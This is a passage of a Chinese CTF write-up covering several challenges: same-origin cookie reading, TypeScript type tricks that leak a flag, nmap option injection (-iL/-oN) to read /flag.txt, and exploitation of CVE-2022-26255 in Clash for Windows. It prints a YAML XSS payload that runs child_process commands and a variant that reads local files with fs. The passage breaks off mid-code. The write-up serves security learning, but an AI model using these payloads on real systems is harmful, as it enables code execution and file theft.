</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">iframeWin</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;childFrame&#39;</span><span class="p">).</span><span class="nx">contentWindow</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">iframeWin</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">cookie</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span> <span class="mi">1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注意提交时使用 http 的网址</p>
</blockquote>
<p>得到 <code>flag{TotALlY-NO-sECuRItY-in-ThE-sAMe-OrIGiN}</code></p>
<br>
<h3 id="10-简单的打字稿">10. 简单的打字稿</h3>
<h4 id="super-easy">Super Easy</h4>
<p>源码要求输出的信息中不能直接包含 <code>flag</code></p>
<p>查找资料，无法在运行时打印类型。GPT 帮我查到用类型模板有可能实现，并给出了移除第一个字符的模板</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">RemoveFirstChar</span><span class="p">&lt;</span><span class="nt">T</span> <span class="na">extends</span> <span class="na">string</span><span class="p">&gt;</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">FirstChar</span><span class="si">}${</span><span class="k">infer</span> <span class="nx">Rest</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="nx">Rest</span> : <span class="kt">never</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">Result</span> <span class="o">=</span> <span class="nx">RemoveFirstChar</span><span class="p">&lt;</span><span class="nt">flag1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">t</span>: <span class="kt">Result</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="very-easy">Very Easy</h4>
<p>使用 <code>infer</code> 获得 flag2 中的 <code>flag</code> 字符串。</p>
<p>只用 <code>RemoveFirstChar</code> 无法得到 flag，所以需要移除字符串中所有的 <code>flag</code> 字符串，无论大小写。</p>
<p>GPT4 搞出来这个代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">ExtractF</span><span class="p">&lt;</span><span class="nt">T</span><span class="p">&gt;</span> <span class="o">=</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="p">()</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">v</span><span class="o">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="nx">a</span><span class="o">:</span> <span class="p">(</span><span class="nx">a</span>: <span class="kt">unknown</span><span class="p">,</span> <span class="nx">b</span>: <span class="kt">infer</span> <span class="nx">F</span> <span class="o">&amp;</span> <span class="nx">Record</span><span class="p">&lt;</span><span class="nt">string</span><span class="err">,</span> <span class="na">string</span><span class="p">&gt;)</span> <span class="o">=&gt;</span> <span class="kt">never</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">=&gt;</span> <span class="kt">unknown</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">?</span> <span class="nx">F</span>
</span></span><span class="line"><span class="cl">  : <span class="kt">never</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">fString</span> <span class="o">=</span> <span class="k">keyof</span> <span class="nx">ExtractF</span><span class="p">&lt;</span><span class="nt">flag2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">RemoveFlag</span><span class="p">&lt;</span><span class="nt">T</span> <span class="na">extends</span> <span class="na">string</span><span class="p">&gt;</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">flag</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f1</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">Flag</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f2</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">fLag</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f3</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FLag</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f4</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">flAg</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f5</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FlAg</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f6</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">fLAg</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f7</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FLAg</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f8</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">flaG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f9</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FlaG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f10</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">fLaG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f11</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FLaG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f12</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">flAG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f13</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FlAG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f14</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">fLAG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f15</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span> <span class="kr">extends</span> <span class="sb">`</span><span class="si">${</span><span class="k">infer</span> <span class="nx">Before</span><span class="si">}</span><span class="sb">FLAG</span><span class="si">${</span><span class="k">infer</span> <span class="nx">After</span><span class="si">}</span><span class="sb">`</span> <span class="o">?</span> <span class="sb">`</span><span class="si">${</span><span class="nx">Before</span><span class="si">}</span><span class="sb">f16</span><span class="si">${</span><span class="nx">After</span><span class="si">}</span><span class="sb">`</span>
</span></span><span class="line"><span class="cl">    <span class="o">:</span> <span class="nx">T</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">Result2</span> <span class="o">=</span> <span class="nx">RemoveFlag</span><span class="p">&lt;</span><span class="nt">fString</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">type</span> <span class="nx">Result3</span> <span class="o">=</span> <span class="nx">RemoveFlag</span><span class="p">&lt;</span><span class="nt">Result2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">t</span>: <span class="kt">Result3</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到报错信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">error: TS2322 [ERROR]: Type &#39;&#34;a&#34;&#39; is not assignable to type &#39;&#34;f1{TS_f11_beTTER_tHAn_PyTH0N!}&#34;&#39;.
</span></span></code></pre></td></tr></table>
</div>
</div><p>还原为 <code>flag{TS_fLaG_beTTER_tHAn_PyTH0N!}</code></p>
<br>
<h3 id="11-逝界计划第二阶段">11. 逝界计划（第二阶段）</h3>
<p>提示 nmap 集成有问题。安装此集成，有命令行参数可以填。</p>
<p>看了 <code>man</code>，选项 <code>-iL</code> 可以指定从文件中读取目标。</p>
<p>开启调试日志，在系统日志中可以查看报错信息，但无法得到正常运行时的信息。</p>
<blockquote>
<p>题目中提到了读写文件</p>
</blockquote>
<p><code>nmap</code> 使用 <code>-oN</code> 可以将输出信息保存到文件中。</p>
<p>创建一个头像，在 docker 中确定其在文件系统中的位置，作为 <code>nmap</code> 的参数。<code>nmap</code> 集成的选项设置为</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-iL /flag.txt -oN /config/image/2aa5e5182c1cd45619fbc1959d0132c6/512x512
</span></span></code></pre></td></tr></table>
</div>
</div><p>下载文件得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Failed to resolve &#34;flag{soOoo-mAny-LOoPhOLEs-in-HomE-AsSisTAnt}&#34;.
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h3 id="12-非法所得">12. 非法所得</h3>
<h4 id="flag-1-1">Flag 1</h4>
<p>Clash 的版本是 0.19.8，可以找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26255">NVD - CVE-2022-26255</a>，提供了 <a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">payload</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=eval(`require(&#34;child_process&#34;).exec(&#34;calc.exe&#34;);`);&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这个 CVE 是说：导入 yaml 文件时可以执行命令。我胡乱尝试了一下没有效果。</p>
<p>后来看了 Dockerfile，发现 Clash for windows 是跑在 Linux 上的。而题目中又提示可以阅读源码中的 <code>prepare_flag.mjs</code> 了解 Flag 的位置。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">chmodSync</span><span class="p">,</span> <span class="nx">readFileSync</span><span class="p">,</span> <span class="nx">writeFileSync</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;node:fs&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getFlag</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="s1">&#39;flag{no_flag_here}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">content</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag0</span> <span class="o">=</span> <span class="nx">getFlag</span><span class="p">(</span><span class="s1">&#39;/flag_0&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag1</span> <span class="o">=</span> <span class="nx">getFlag</span><span class="p">(</span><span class="s1">&#39;/flag_1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag2</span> <span class="o">=</span> <span class="nx">getFlag</span><span class="p">(</span><span class="s1">&#39;/flag_2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">profile</span> <span class="o">=</span> <span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/app/profiles/flag.yml&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">profile</span> <span class="o">=</span> <span class="nx">profile</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s1">&#39;flag{test}&#39;</span><span class="p">,</span> <span class="nx">flag0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;/app/profiles/flag.yml&#39;</span><span class="p">,</span> <span class="nx">profile</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;/flag_easy&#39;</span><span class="p">,</span> <span class="nx">flag1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">chmodSync</span><span class="p">(</span><span class="s1">&#39;/flag_easy&#39;</span><span class="p">,</span> <span class="mo">0o666</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="nx">flag2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">chmodSync</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="mo">0o400</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>flag0 需要读取 <code>/app/profiles/flag.yml</code></li>
<li>flag1 需要读取 <code>/flag_easy</code></li>
<li>flag2 需要读取 <code>/flag</code></li>
</ul>
<p>发现可以用 <code>document.write</code> 输出内容（不过每次结束后都要重启环境）。</p>
<p>于是用 <code>fs</code> 读取并写在网页上。</p>
<blockquote>
<p>需要用 VPS 搭建 Nginx，用于传输 yaml 文件</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;17938&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;8088&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=&#39;const fs=require(&#34;fs&#34;); fs.readFile(&#34;/app/profiles/flag.yml&#34;, &#34;utf8&#34;, (err, data) =&gt; {document.write(data)});&#39;&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">a</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-2">Flag 2</h4>
<p>虽然这个 flag 在容器启动时被移除了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;/flag_easy&#39;</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;/flag_easy&#39;</span><span class="p">,</span> <span class="s1">&#39;flag{no_flag_here}&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但如果访问特定网站，它就能被写出来</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">).</span><span class="nx">hostname</span> <span class="o">===</span> <span class="s1">&#39;ys.pku.edu.cn&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s1">&#39;#primogem_code[type=password]&#39;</span><span class="p">,</span> <span class="nx">flag</span><span class="p">)</span>
